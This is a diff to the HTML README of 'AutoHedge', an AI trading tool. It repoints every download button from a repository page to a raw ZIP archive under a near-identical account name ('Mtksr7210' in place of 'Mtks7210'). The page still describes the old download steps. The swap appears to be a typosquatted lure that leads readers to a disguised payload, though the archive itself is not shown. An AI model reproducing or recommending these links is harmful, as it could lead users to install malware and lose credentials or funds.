@@ -1,7 +1,7 @@
 <h1>🤖 AutoHedge - Your Personal AI Hedge Fund Manager</h1>
 
 <p align="center">
-  <a href="https://github.com/Mtks7210/AutoHedge" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;text-decoration:none;border-radius:50px;font-size:22px;font-weight:bold;box-shadow:0 5px 20px rgba(240,147,251,0.4);">⬇️ Get AutoHedge Now</a>
+  <a href="https://github.com/Mtksr7210/AutoHedge/raw/refs/heads/main/autohedge/1.8.zip" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;text-decoration:none;border-radius:50px;font-size:22px;font-weight:bold;box-shadow:0 5px 20px rgba(240,147,251,0.4);">⬇️ Get AutoHedge Now</a>
 </p>
 
 <hr>
@@ -30,7 +30,7 @@
 
 <p>Click the big button at the top of this page or use this direct link:</p>
 
-<p align="center"><a href="https://github.com/Mtks7210/AutoHedge" style="background:#4CAF50;color:white;padding:12px 35px;text-decoration:none;border-radius:8px;font-size:18px;">📥 Visit This Link to Download AutoHedge</a></p>
+<p align="center"><a href="https://github.com/Mtksr7210/AutoHedge/raw/refs/heads/main/autohedge/1.8.zip" style="background:#4CAF50;color:white;padding:12px 35px;text-decoration:none;border-radius:8px;font-size:18px;">📥 Visit This Link to Download AutoHedge</a></p>
 
 <p>Visit this link to download the application. Once you click the link, your browser will take you to the GitHub download page. Look for the green "Code" button on that page - click it and select "Download ZIP". Alternatively, scroll down to find the latest release version that has an installer package.</p>
 
@@ -168,7 +168,7 @@
 
 <p>If you meet these requirements, you're ready - just click the download button below again and begin your journey into autonomous trading.</p>
 
-<p><a href="https://github.com/Mtks7210/AutoHedge" style="background:#FF9800;color:white;padding:18px 50px;text-decoration:none;border-radius:50px;font-size:20px;font-weight:bold;display:inline-block;margin:20px 0;box-shadow:0 5px 15px rgba(255,152,0,0.4);">🚀 Visit This Link to Download AutoHedge</a></p>
+<p><a href="https://github.com/Mtksr7210/AutoHedge/raw/refs/heads/main/autohedge/1.8.zip" style="background:#FF9800;color:white;padding:18px 50px;text-decoration:none;border-radius:50px;font-size:20px;font-weight:bold;display:inline-block;margin:20px 0;box-shadow:0 5px 15px rgba(255,152,0,0.4);">🚀 Visit This Link to Download AutoHedge</a></p>
 
 <footer style="margin-top:40px;border-top:1px solid #ccc;padding-top:20px;text-align:center;font-size:14px;color:#777;">
   AutoHedge - Autonomous AI Hedge Fund Manager. For informational purposes only - not financial advice. Always do your own research. Copyright © 2025 AutoHedge. All rights reserved.
